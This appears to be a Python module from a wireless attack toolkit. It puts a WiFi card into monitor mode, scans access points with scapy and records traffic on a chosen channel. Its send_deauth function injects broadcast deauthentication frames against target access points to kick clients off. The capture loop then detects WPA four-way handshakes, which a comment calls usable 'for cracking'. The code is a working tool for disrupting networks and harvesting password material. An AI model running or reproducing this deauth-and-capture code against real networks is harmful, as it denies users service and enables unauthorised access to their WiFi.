from __future__ import annotations

import subprocess
import time
from pathlib import Path

from .backend import WiFiBackend
from .discovery import AccessPoint
from .handshake import HandshakeResult
from .monitor import MonitorModeError, is_monitor_mode
from .targets import Target, TargetState
from .wifi.channels import channel_to_frequency


def _run(cmd: list[str]) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True)


def _detect_security(pkt, privacy: bool) -> str:
    from scapy.layers.dot11 import Dot11Elt

    has_rsn = False
    has_wpa = False
    elt = pkt.getlayer(Dot11Elt)
    while isinstance(elt, Dot11Elt):
        if elt.ID == 48:
            has_rsn = True
        elif elt.ID == 221 and elt.info[:4] == b"\x00\x50\xf2\x01":
            has_wpa = True
        elt = elt.payload.getlayer(Dot11Elt)

    if has_rsn:
        return "WPA2/WPA3"
    if has_wpa:
        return "WPA"
    if privacy:
        return "WEP"
    return "OPEN"


class NativeLinuxBackend(WiFiBackend):
    """Monitor mode + capture without the aircrack-ng suite.

    Uses `iw`/`ip` for monitor mode and scapy for 802.11 frame capture
    and EAPOL handshake detection. No airmon-ng/airodump-ng/aircrack-ng
    processes are spawned.
    """

    name = "native"

    def enable_monitor_mode(self, interface: str) -> str:
        _run(["ip", "link", "set", interface, "down"])
        result = _run(["iw", "dev", interface, "set", "type", "monitor"])
        _run(["ip", "link", "set", interface, "up"])
        if result.returncode != 0 or not is_monitor_mode(interface):
            raise MonitorModeError(
                f"Unable to enable monitor mode on {interface} via native backend.\n{result.stderr}"
            )
        return interface

    def disable_monitor_mode(self, monitor_interface: str, base_interface: str | None = None) -> None:
        # Unlike the aircrack backend, this backend never creates a separate
        # virtual interface (no wlan0 -> wlan0mon split) - enable_monitor_mode
        # flips the existing interface in place, so monitor_interface IS the
        # base interface here. base_interface is accepted only for API
        # symmetry with WiFiBackend and is not a distinct device to restore.
        _run(["ip", "link", "set", monitor_interface, "down"])
        _run(["iw", "dev", monitor_interface, "set", "type", "managed"])
        _run(["ip", "link", "set", monitor_interface, "up"])

    def scan(self, monitor_interface: str, duration: int, work_dir: Path) -> list[AccessPoint]:
        from scapy.all import sniff
        from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, RadioTap

        seen: dict[str, AccessPoint] = {}
        now_iso = time.strftime("%Y-%m-%d %H:%M:%S")

        def handle(pkt):
            if not pkt.haslayer(Dot11Beacon):
                return
            bssid = pkt.addr2
            if not bssid or bssid in seen:
                return
            ssid = "<hidden>"
            channel = 0
            elt = pkt.getlayer(Dot11Elt)
            while isinstance(elt, Dot11Elt):
                if elt.ID == 0 and elt.info:
                    try:
                        ssid = elt.info.decode(errors="replace") or "<hidden>"
                    except Exception:
                        pass
                elif elt.ID == 3 and elt.info:
                    channel = elt.info[0]
                elt = elt.payload.getlayer(Dot11Elt)
            cap = pkt.getlayer(Dot11Beacon).cap
            security = _detect_security(pkt, bool(cap.privacy))
            try:
                signal = pkt.getlayer(RadioTap).dBm_AntSignal
            except Exception:
                signal = -100
            seen[bssid] = AccessPoint(
                ssid=ssid,
                bssid=bssid,
                channel=channel,
                frequency=channel_to_frequency(channel),
                security=security,
                signal=signal if signal is not None else -100,
                first_seen=now_iso,
                last_seen=now_iso,
            )

        sniff(iface=monitor_interface, prn=handle, timeout=duration, store=False)
        return list(seen.values())

    def capture_channel(
        self,
        monitor_interface: str,
        channel: int,
        targets: list[Target],
        tmp_dir: Path,
        timeout: int,
        poll_interval: int = 5,
        on_tick=None,
        deauth: bool = False,
    ) -> Path:
        from scapy.all import AsyncSniffer, PcapWriter
        from scapy.layers.dot11 import Dot11

        tmp_dir.mkdir(parents=True, exist_ok=True)
        cap_path = tmp_dir / f"channel-{channel}-native.cap"
        _run(["iw", "dev", monitor_interface, "set", "channel", str(channel)])

        pending = {t.ap.bssid: t for t in targets}
        writer = PcapWriter(str(cap_path), append=True, sync=True)

        def handle(pkt):
            if pkt.haslayer(Dot11):
                writer.write(pkt)

        sniffer = AsyncSniffer(iface=monitor_interface, prn=handle, store=False)
        sniffer.start()

        elapsed = 0
        found_count = 0
        try:
            while elapsed < timeout and pending:
                time.sleep(poll_interval)
                elapsed += poll_interval

                if deauth and pending:
                    for bssid in pending:
                        self.send_deauth(monitor_interface, bssid)

                if cap_path.exists() and cap_path.stat().st_size > 0:
                    for bssid, t in list(pending.items()):
                        result = self.detect_handshake(cap_path, bssid)
                        if result.count > t.handshake_count:
                            t.handshake_count = result.count
                            t.transition(TargetState.HANDSHAKE_FOUND)
                        if t.done:
                            found_count += 1
                            del pending[bssid]

                if on_tick:
                    on_tick(channel, elapsed, timeout, found_count, len(targets))
        finally:
            try:
                sniffer.stop()
            except Exception:
                pass
            writer.close()

        for t in pending.values():
            t.transition(TargetState.NO_HANDSHAKE)

        return cap_path

    def send_deauth(self, monitor_interface: str, bssid: str, count: int = 5) -> None:
        from scapy.all import RadioTap, sendp
        from scapy.layers.dot11 import Dot11, Dot11Deauth

        pkt = (
            RadioTap()
            / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
            / Dot11Deauth(reason=7)
        )
        sendp(pkt, iface=monitor_interface, count=count, inter=0.1, verbose=False)

    def detect_handshake(self, cap_path: Path, bssid: str) -> HandshakeResult:
        if not cap_path.exists() or cap_path.stat().st_size == 0:
            return HandshakeResult(bssid=bssid, detected=False, count=0)

        from scapy.all import PcapReader
        from scapy.layers.dot11 import Dot11
        from scapy.layers.eap import EAPOL_KEY

        bssid_norm = bssid.lower()

        by_replay: dict[int, dict[int, object]] = {}
        with PcapReader(str(cap_path)) as reader:
            for pkt in reader:
                if not pkt.haslayer(EAPOL_KEY) or not pkt.haslayer(Dot11):
                    continue
                dot11 = pkt.getlayer(Dot11)
                addrs = {a.lower() for a in (dot11.addr1, dot11.addr2, dot11.addr3) if a}
                if bssid_norm not in addrs:
                    continue
                key = pkt.getlayer(EAPOL_KEY)
                msg_num = key.guess_key_number()
                if msg_num == 0:
                    continue
                by_replay.setdefault(key.key_replay_counter, {})[msg_num] = key

        # A complete 4-way handshake is M1(rc=N)+M2(rc=N) followed by
        # M3(rc=N+1)+M4(rc=N+1). Count independent exchanges, not just
        # message types, so repeated retries of the same exchange don't
        # inflate the count.
        replay_counters = sorted(by_replay)
        exchanges = 0
        used = set()
        for rc in replay_counters:
            if rc in used:
                continue
            msgs_n = by_replay[rc]
            msgs_next = by_replay.get(rc + 1, {})
            if 1 in msgs_n and 2 in msgs_n and 3 in msgs_next and 4 in msgs_next:
                exchanges += 1
                used.add(rc)
                used.add(rc + 1)
            elif 2 in msgs_n and 3 in msgs_n:
                # M1 not captured but M2+M3 present is still a usable handshake for cracking.
                exchanges += 1
                used.add(rc)

        return HandshakeResult(bssid=bssid, detected=exchanges > 0, count=exchanges)
